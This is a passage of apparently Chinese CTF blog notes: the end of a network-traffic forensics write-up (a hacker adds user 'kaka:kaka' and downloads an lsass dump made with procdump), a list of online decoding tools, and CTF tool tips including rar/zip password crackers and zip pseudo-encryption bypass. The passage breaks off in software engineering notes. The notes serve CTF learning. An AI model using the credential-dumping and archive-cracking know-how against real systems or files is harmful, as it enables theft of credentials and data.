src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219222852431.jpg" alt="img"></p><p>发现使用了procdump.exe<br>同时发现文件</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689148.jpeg" alt="img"></p><p>解码得到</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219222934268.jpg" alt="img"></p><p>最后我们可以确定，黑客下载了<code>lsass.exe_180208_185247.dmp</code>文件</p><p>答案</p><pre><code class="vbnet">1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候18:37:38.4824202.黑客在内网主机中添加的用户名和密码是多少kaka:kaka3.黑客从内网服务器中下载下来的文件名lsass.exe_180208_185247.dmp</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF Crypto/MISC 在线工具网站</title>
      <link href="/2023/03/07/CTF%20CryptoMISC%20%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/"/>
      <url>/2023/03/07/CTF%20CryptoMISC%20%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Crypto-x2F-MISC-在线工具网站"><a href="#CTF-Crypto-x2F-MISC-在线工具网站" class="headerlink" title="CTF Crypto&#x2F;MISC 在线工具网站"></a>CTF Crypto&#x2F;MISC 在线工具网站</h1><h2 id="在线解码"><a href="#在线解码" class="headerlink" title="在线解码"></a>在线<a href="https://so.csdn.net/so/search?q=%E8%A7%A3%E7%A0%81&spm=1001.2101.3001.7020">解码</a></h2><ol><li>Unicode（HTML）编码解码：<a href="http://www.ofmonkey.com/encode/html">http://www.ofmonkey.com/encode/html</a></li></ol><blockquote><p>示例<br><code>f1ag&#123;si11yb0yemmm&#125;</code></p></blockquote><ol><li>XXencode编码：<a href="http://web.chacuo.net/charsetxxencode">http://web.chacuo.net/charsetxxencode</a></li><li>Brainfuck编码：<a href="https://tool.bugku.com/brainfuck/?wafcloud=1">https://tool.bugku.com/brainfuck/?wafcloud=1</a></li></ol><blockquote><p>示例：<br>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— –.+. —– -.&lt;++<br>+++++ [-&gt;++ +++++ &lt;]&gt;++ ++.– –.&lt;+ +++++ [-&gt;– —-&lt; ]&gt;— —– .—-<br>–.++ +++++ +.&lt;++ +[-&gt;- –&lt;]&gt; –.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;<br>+++++ +++.&lt; +++++ ++[-&gt; —– –&lt;]&gt; —.+ +++++ +.+++ ++.– —– .&lt;+++<br>++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;— —-&lt; ]&gt;— —– .&lt;+++ ++++[<br>-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;— —-&lt; ]&gt;.++ ++.– -.— -.&lt;++ +++++<br>[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;– —-&lt; ]&gt;— —– —.- –.&lt;+ +++++<br>+[-&gt;+ +++++ +&lt;]&gt;+ …&lt;++ ++++[ -&gt;— —&lt;] &gt;—- –.– -.+.+ ++.– —.+<br>++++. —– —-. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;</p></blockquote><ol><li>可打印字符编码（Quoted_Printable）：<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></li></ol><blockquote><p>示例<br>&#x3D;E6&#x3D;8A&#x3D;80&#x3D;E6&#x3D;9C&#x3D;AF&#x3D;E6&#x3D;9C&#x3D;89&#x3D;E6&#x3D;B8&#x3D;A9&#x3D;E5&#x3D;BA&#x3D;A6</p></blockquote><ol><li>摩斯密码：<a href="https://www.jb51.net/tools/morse.htm,http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">https://www.jb51.net/tools/morse.htm,http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></li></ol><blockquote><p>示例<br>…-. .-… .- –. . –… .—- -.-. .- … -.-. -… -…- –… -… -… —-. -…- …- -… .- …– -…- —-. …– —… …– -…- .—- .- …-. —… -… –… —… —… .—- …-. —– –…</p></blockquote><ol><li>培根密码:<a href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></li></ol><blockquote><p>A&#x2F;a aaaaa H&#x2F;h aabbb O&#x2F;o abbba V&#x2F;v babab<br>B&#x2F;b aaaab I&#x2F;i abaaa P&#x2F;p abbbb W&#x2F;w babba<br>C&#x2F;c aaaba J&#x2F;j abaab Q&#x2F;q baaaa X&#x2F;x babbb<br>D&#x2F;d aaabb K&#x2F;k ababa R&#x2F;r baaab Y&#x2F;y bbaaa<br>E&#x2F;e aabaa L&#x2F;l ababb S&#x2F;s baaba Z&#x2F;z bbaab<br>F&#x2F;f aabab M&#x2F;m abbaa T&#x2F;t baabb<br>G&#x2F;g aabba N&#x2F;n abbab U&#x2F;u babaa</p></blockquote><ol><li>栅栏密码：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></li><li>W型栅栏密码：<a href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a></li></ol><blockquote><p>示例<br>f5-lf5aa9gc9{-8648cbfb4f979c-c2a851d6e5-c}</p></blockquote><ol><li>jsfuck解码：<a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></li></ol><blockquote><p>示例<br>([][([()][+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]])(+!+[])</p></blockquote><ol><li>波利比奥斯密码：<a href="http://ctf.ssleye.com/tapcode.html">http://ctf.ssleye.com/tapcode.html</a><br>![在这里插入图片描述](&#x2F;..&#x2F;pic&#x2F;CTF CryptoMISC 在线工具网站.assets&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70.png)</li><li>条形码&amp;&amp;二维码在线解码：<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></li><li>与佛论禅：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>新约佛论禅：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></li></ol><blockquote><p>佛曰：夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</p></blockquote><ol><li>云影密码：</li></ol><blockquote><p>01248密码，又称云影密码…与二进制幂加密不同，这个加密法采用的是0作间隔，其他非0数隔开后组合起来相加表示序号1-26之一的字母（a&#x2F;A,b&#x2F;B,c&#x2F;C…z&#x2F;Z)</p></blockquote><ol><li>OOK解码：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></li></ol><blockquote><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook. Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</p></blockquote><ol><li>base58在线编码解码：<a href="http://www.metools.info/code/c74.html">http://www.metools.info/code/c74.html</a></li></ol><h2 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h2><ol><li>AES在线解密：<a href="https://www.sojson.com/encrypt_aes.html%EF%BC%8C">https://www.sojson.com/encrypt_aes.html，</a> <a href="http://tool.chacuo.net/cryptaes?_wv=1">http://tool.chacuo.net/cryptaes?_wv=1</a></li><li>维吉尼亚密码：<a href="https://quipqiup.com/">https://quipqiup.com/</a></li><li>MD5解密：<a href="https://www.cmd5.com/;http://www.dmd5.com/#">https://www.cmd5.com/;http://www.dmd5.com/#</a></li><li>跳舞小人(Dancing Men Cipher)：<a href="https://www.dcode.fr/dancing-men-cipher">https://www.dcode.fr/dancing-men-cipher</a></li></ol><blockquote><p>![在这里插入图片描述](&#x2F;..&#x2F;pic&#x2F;CTF CryptoMISC 在线工具网站.assets&#x2F;20200525093832449.png)</p></blockquote><ol><li>alphabet minimoys：<a href="https://www.dcode.fr/arthur-invisibles-cipher">https://www.dcode.fr/arthur-invisibles-cipher</a></li></ol><blockquote><p>![在这里插入图片描述](&#x2F;..&#x2F;pic&#x2F;CTF CryptoMISC 在线工具网站.assets&#x2F;20200525094233791.png)</p></blockquote><ol><li>JS混淆解密：<a href="http://tool.chinaz.com/js.aspx">http://tool.chinaz.com/js.aspx</a></li></ol><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><ol><li>Linux x86 系统调用号以及寄存器传参：<a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html">https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html</a></li><li>Linux x64 系统调用号以及寄存器传参：<a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li><li>在线Libc搜索：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li></ol><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ol><li>rsa大整数分解：<a href="http://factordb.com//">http://factordb.com/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF比赛必备常用工具</title>
      <link href="/2023/03/07/CTF%E6%AF%94%E8%B5%9B%E5%BF%85%E5%A4%87%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/03/07/CTF%E6%AF%94%E8%B5%9B%E5%BF%85%E5%A4%87%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF比赛必备常用工具"><a href="#CTF比赛必备常用工具" class="headerlink" title="CTF比赛必备常用工具"></a>CTF比赛必备常用工具</h1><h2 id="常用MISC（杂项）工具"><a href="#常用MISC（杂项）工具" class="headerlink" title="常用MISC（杂项）工具"></a>常用MISC（杂项）工具</h2><h3 id="1-Audacity-（提取莫斯密码辅助工具）"><a href="#1-Audacity-（提取莫斯密码辅助工具）" class="headerlink" title="1. Audacity （提取莫斯密码辅助工具）"></a><strong>1. Audacity （提取莫斯密码辅助工具）</strong></h3><p>题目中遇到音频文件，听到长短不一的声音，往往就是摩斯密码题了，你还傻傻靠自己耳朵听几长几短吗？别做梦了，你不是间谍，搞不定的。仅需将文件拖进这个软件，如下图，一目了然。</p><p><img src="https://pic3.zhimg.com/80/v2-94d6afc10041ea2916f31842ec9ad372_720w.jpg" alt="img"></p><h3 id="2-stegsolve-（图片隐写分析工具）"><a href="#2-stegsolve-（图片隐写分析工具）" class="headerlink" title="2. stegsolve （图片隐写分析工具）"></a><strong>2. stegsolve （图片隐写分析工具）</strong></h3><p>此款软件，非常常用，建议下载后，网上搜索学习如何使用。</p><p>简单介绍就是：选中可疑图片打开。利用四个功能，查看图片中隐藏的各种信息。打开可疑动图</p><p><img src="https://pic3.zhimg.com/80/v2-c24db0c37d11c9af4b6366d3ba38c46e_720w.jpg" alt="img"></p><h3 id="3-QR-Research-（二维码工具）"><a href="#3-QR-Research-（二维码工具）" class="headerlink" title="3. QR_Research （二维码工具）"></a><strong>3. QR_Research （二维码工具）</strong></h3><p>查找二维码信息的工具，选取工具中截图查看二维码</p><p><img src="https://pic1.zhimg.com/80/v2-75b037b3188178bd903aa9520a742a50_720w.jpg" alt="img"></p><h3 id="4-ZipCenOp-jar-验证是否为伪加密工具"><a href="#4-ZipCenOp-jar-验证是否为伪加密工具" class="headerlink" title="4. ZipCenOp.jar(验证是否为伪加密工具)"></a><strong>4. ZipCenOp.jar(验证是否为伪加密工具)</strong></h3><p>有些压缩包是伪加密的。表现形式是压缩包需要解压密码，但是破解工具又找不到密码。如果是伪加密，其实只要修改hex文件中某位为偶数，即可无密码打开。具体原理可以自行搜索。</p><p><img src="https://pic1.zhimg.com/80/v2-d4f74b749db0eef9305b69159e0b4b44_720w.png" alt="img"></p><h3 id="5-AAPR-rar密码破解工具"><a href="#5-AAPR-rar密码破解工具" class="headerlink" title="5. AAPR(rar密码破解工具)"></a><strong>5. AAPR(rar密码破解工具)</strong></h3><p>rar压缩包是加密的打不开，不要紧，使用此工具，轻松破解</p><p><img src="https://pic3.zhimg.com/80/v2-27f3d36c2873baacbf9161f4d865d35a_720w.jpg" alt="img"></p><h3 id="6-Ziperello-zip密码破解工具"><a href="#6-Ziperello-zip密码破解工具" class="headerlink" title="6. Ziperello(zip密码破解工具)"></a><strong>6. Ziperello(zip密码破解工具)</strong></h3><p>使用方式与上面的软件类似，不过这个速度更快，接近准工业级的破解速度了，非常惊人。</p><p><img src="https://pic1.zhimg.com/80/v2-f8cccb89adfa5500a64666bb2a83b550_720w.jpg" alt="img"></p><h3 id="7-Winhex-程序查看调试工具"><a href="#7-Winhex-程序查看调试工具" class="headerlink" title="7.Winhex(程序查看调试工具)"></a><strong>7.Winhex(程序查看调试工具)</strong></h3><p>使用很简单，将文件拖进winhex即可。如上题，将伪加密压缩包拖进这个文件，修改hex（奇数改为偶数即可），破解加密防护。</p><p>修改前 最后蓝线09 00</p><p><img src="https://pic3.zhimg.com/80/v2-d331659b02eda3130e58f4fd1f87897e_720w.jpg" alt="img"></p><p>修改后 08 00 然后另存为一个压缩吧，直接打开，不再需要密码。伪加密的压缩包就是这么纸老虎，仅此而已。</p><p><img src="https://pic3.zhimg.com/80/v2-ab9a85b1da64aa115492afe8847feeb2_720w.jpg" alt="img"></p><h3 id="8-RouterPassView-路由器配置查看工具"><a href="#8-RouterPassView-路由器配置查看工具" class="headerlink" title="8. RouterPassView(路由器配置查看工具)"></a><strong>8. RouterPassView(路由器配置查看工具)</strong></h3><p>千辛万苦搞到些路由器、交换机的配置文件，可要么打不开，要么是乱码。不妨试试这款专门查看某些品牌路由器配置文件的工具。见下图，一目了然：</p><p><img src="https://pic3.zhimg.com/80/v2-032ba4a6a4bbd79bd594eada223d5ce6_720w.jpg" alt="img"></p><h2 id="PNG通用解题方式"><a href="#PNG通用解题方式" class="headerlink" title="PNG通用解题方式"></a>PNG通用解题方式</h2><p>一、PNG图片格式</p><p>1、识别：</p><p>开始标志：89 50 4E 47 0D 0A 1A 0A 可见文本：‰PNG</p><p>结束标志：60 82</p><p>二、常用解题方法</p><p>1、010edit分析<br>1.1 尝试修改文件高度<br>1.2 分析文件是否逆序、高低字节转换等。<br>1.3 分析文件结尾是否有多余数据。<br>1.4 分析各个IDAT块异常，多余的正常IDAT。</p><p>2、StegSolve</p><p>2.1、对图像进行分通道扫描<br>2.2、分析data Extract的red blue green，查看是否为LSB隐写</p><p>3、strings 、 exiftool、 pngcheck -v 、binwalk、foremost 命令分析处理</p><p>使用以上命令分析文件。</p><p>4、zsteg</p><p>zsteg支持png和bmp隐写分析</p><p>zsteg xxx.png<br>zsteg xxx.png -a</p><p>5、stegpy</p><p>需要先获取密码，后使用如下命令：</p><p>stegpy xxx.png -p pwd</p><p>6、Oursecret</p><p>使用Oursecret工具解密图片，需要密码。</p><p>7、SlientEye</p><p>使用SlientEye工具解密图片</p><p>8、zlib解密脚本:</p><p>我们找到存在问题的IDAT块，利用 python zlib解压多余 IDAT 块的内容，此时注意剔除 长度、数据块类型及末尾的 CRC 校验值。</p><p>三、常用python脚本：<br>1、zlib解密：<br>import zlib<br>import binascii<br>IDAT &#x3D; “789…667”.decode(‘hex’)<br>result &#x3D; binascii.hexlify(zlib.decompress(IDAT))<br>print result</p><p>2、高低字节反转<br>with open(‘xxx.png’,’rb’) as f:<br>src &#x3D; f.read()<br>print(src[:16])<br>dest &#x3D;list()<br>for i in range(int(len(src)&#x2F;2)):<br>dest.append(src[2<em>i+1])<br>dest.append(src[2</em>i])<br>dest &#x3D; bytes(dest)<br>with open(‘flag.png’,’wb’) as f:<br>f.write(dest)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密原理及操作</title>
      <link href="/2023/03/07/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/03/07/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="zip伪加密原理及操作"><a href="#zip伪加密原理及操作" class="headerlink" title="zip伪加密原理及操作"></a>zip伪加密原理及操作</h1><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/20160718203742127.png" alt="这里写图片描述"><br><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是<a href="https://so.csdn.net/so/search?q=%E5%A4%B4%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">头文件</a>标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） 头文件标记后2bytes<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br><strong>压缩源文件目录区：</strong> </p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50) </p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性 </p><p>00 00 00 00：局部头部偏移量</p><p>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小 </p><p>3E 00 00 00：目录区对第一张磁盘的偏移量</p><p>00 00：ZIP 文件注释长度</p><p> 这个详细的介绍了各部分的含义，修改其压缩源文件目录区的全布局方式标记比特值之后即可对文件<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>或解密。</p><p>具体操作如下：</p><p>压缩源文件数据区：50 4B 03 04：这是头文件标记</p><p>压缩源文件目录区：</p><p>50 4B 01 02：目录中文件文件头标记</p><p>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行<a href="https://so.csdn.net/so/search?q=%E4%BC%AA%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">伪加密</a>，改为09 00打开就会提示有密码了）</p><p>压缩源文件目录结束标志 ：50 4B 05 06：目录结束标记 </p><p>我们用winhex打开压缩包，搜索504B，点击第二个504B（压缩源文件目录区）</p><p><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/Center.png" alt="img"></p><p>-———————————————————————————————————–</p><p><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/Center-16683522054451.png" alt="img"></p><p>将全局方式位标记中的09改为00后，打开压缩包</p><p><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/Center-16683522054462.png" alt="img"></p><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p><p>那么，如何辨别当前的zip是真的加密还是伪加密？</p><h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code>（504B0304四个bytes之后）</p><h3 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code><br><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/SouthEast.png" alt="这里写图片描述"></p><h3 id="使用工具【ZipCenOp-jar】自动修复zip伪加密文件"><a href="#使用工具【ZipCenOp-jar】自动修复zip伪加密文件" class="headerlink" title="使用工具【ZipCenOp.jar】自动修复zip伪加密文件"></a>使用工具【ZipCenOp.jar】自动修复zip伪加密文件</h3><p>1.用010检查zip压缩包，发现压缩包文件是<a href="https://so.csdn.net/so/search?q=%E4%BC%AA%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">伪加密</a>，但是找不到要修改伪加密的地方<br><img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5bi45ZCD5LiN5LiL5LqG,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>2.查了很多资料，最后用大佬给的工具【ZipCenOp.jar】修复了压缩包</p><p>步骤<br>把ZipCenOp.jar和需要解压的压缩包文件放到同一目录下，然后 cmd 进入进入当前目录下</p><p>输入下面的命令：<br>java -jar ZipCenOp.jar r lm.zip<img src="/../pic/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E6%93%8D%E4%BD%9C.assets/f5b4529b5a764062b25a043345f1dbd1.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件工程导论</title>
      <link href="/2022/11/24/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA/"/>
      <url>/2022/11/24/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="软件工程导论"><a href="#软件工程导论" class="headerlink" title="软件工程导论"></a>软件工程导论</h1><h2 id="一、软件工程学概述"><a href="#一、软件工程学概述" class="headerlink" title="一、软件工程学概述"></a>一、软件工程学概述</h2><h3 id="1-1-软件与软件危机"><a href="#1-1-软件与软件危机" class="headerlink" title="1.1 软件与软件危机"></a>1.1 软件与软件危机</h3><h4 id="一、软件的概念、特点与发展"><a href="#一、软件的概念、特点与发展" class="headerlink" title="一、软件的概念、特点与发展"></a>一、软件的概念、特点与发展</h4><h5 id="1-软件发展经历三个阶段："><a href="#1-软件发展经历三个阶段：" class="headerlink" title="(1)软件发展经历三个阶段："></a>(1)软件发展经历三个阶段：</h5><p>程序设计阶段一50至60年代<br>程序系统阶段一60至70年代<br>软件工程阶段一70年代以后</p><h5 id="2-软件的概念："><a href="#2-软件的概念：" class="headerlink" title="(2)软件的概念："></a>(2)软件的概念：</h5><p>软件是计算机系统中与硬件相互依存的另一部分，它包括<strong>程序</strong>、<strong>数据</strong>及其<strong>相关文档</strong>的完整集合。软件&#x3D;程序+数据+文档<br><strong>数据</strong>：是使程序能够适当处理信息的数据结构。<br><strong>程序</strong>：是能够完成预定功能和性能的可执行指令序列。<br><strong>文档</strong>：是开发、使用和维护过程程序所需要的图文资料。</p><h5 id="3-软件的特点："><a href="#3-软件的特点：" class="headerlink" title="(3)软件的特点："></a>(3)软件的特点：</h5><p>1.软件本身的复杂性<br>2.软件的成本高昂<br>3.软件开发未摆脱手工开发方式<br>4.软件维护与硬件有本质差，维护难度高<br>5.软件开发不是传统硬件制造过程<br>6.软件是一种逻辑实体，无磨损性</p><h4 id="二、软件危机"><a href="#二、软件危机" class="headerlink" title="二、软件危机"></a>二、软件危机</h4><h5 id="1-软件危机的概念："><a href="#1-软件危机的概念：" class="headerlink" title="(1)软件危机的概念："></a>(1)软件危机的概念：</h5><p>在计算机软件开发和维护过程中所遇到的一系列严重问题。<br>软件危机包含两方面内容：<br>1、如何开发软件，以满足对软件日益增长的需常<br>2、如何维护数量不断膨胀的已有软件</p><p><strong>(2)软件危机的表现：</strong></p><ul><li>对软件开发成本和进度估算不准确</li><li>用户对已完成软件不满意</li><li>软件质量不可靠</li><li>软件不可维护</li><li>没有适当文档资料</li><li>软件成本在计算机系统中所占比例逐年上升</li><li>软件开发生产率低</li></ul><h5 id="3-软件危机的原因"><a href="#3-软件危机的原因" class="headerlink" title="(3)软件危机的原因"></a>(3)软件危机的原因</h5><p><strong>1、主观原因：</strong><br>忽视需求分析<br>轻视软件维护<br>没有认识到程序只是软件的一部分<br>没有认识到软件开发只是漫长的软件生命周期中一个比较次要阶段<br>越到后期引入变动付出代价越高昂</p><p><strong>2、客观原因：</strong><br>软件是逻辑实体、缺乏可见性，管理和控制困难<br>软件不会磨损，维护意味着修改原来设计，维护困难<br>软件规模庞大，程序复杂性随规模增加指数上升</p><h5 id="4-消除软件危机的途径："><a href="#4-消除软件危机的途径：" class="headerlink" title="(4)消除软件危机的途径："></a>(4)消除软件危机的途径：</h5><p>1、对计算机软件应该有正确认识<br>2、吸取借鉴人类长期从事各种工程项目积累的原理、概念、技术和方法<br>3、积极开发和使用计算机辅助开发工具<br>4、探索更好更有效的管理措施和手段对开发过程进行控制和管理</p><p>管理+技术</p><h3 id="1-2-软件工程"><a href="#1-2-软件工程" class="headerlink" title="1.2 软件工程"></a>1.2 软件工程</h3><h5 id="1-软件工程定义："><a href="#1-软件工程定义：" class="headerlink" title="(1)软件工程定义："></a>(1)软件工程定义：</h5><p>采用<strong>工程</strong>的概念、原理、技术和方法来开发与维护软件，把经过时间考验而证明正确的<strong>管理技术</strong>和当前能够得到的最好的<strong>技术方法</strong>结合起来，<strong>经济</strong>的开发出<strong>高质量</strong>的软件并<strong>维护</strong>它。</p><h5 id="2-软件工程的本质特性："><a href="#2-软件工程的本质特性：" class="headerlink" title="(2)软件工程的本质特性："></a>(2)软件工程的本质特性：</h5><ul><li>关注大型程序的构造</li><li>中心课题是控制复杂性</li><li>软件经常变化</li><li>开发效率非常重要</li><li>开发人员和谐合作是关键</li><li>软件需有效支持用户</li><li>软件开发者替代其他领域人员创造产品</li></ul><h5 id="3-软件工程基本原理："><a href="#3-软件工程基本原理：" 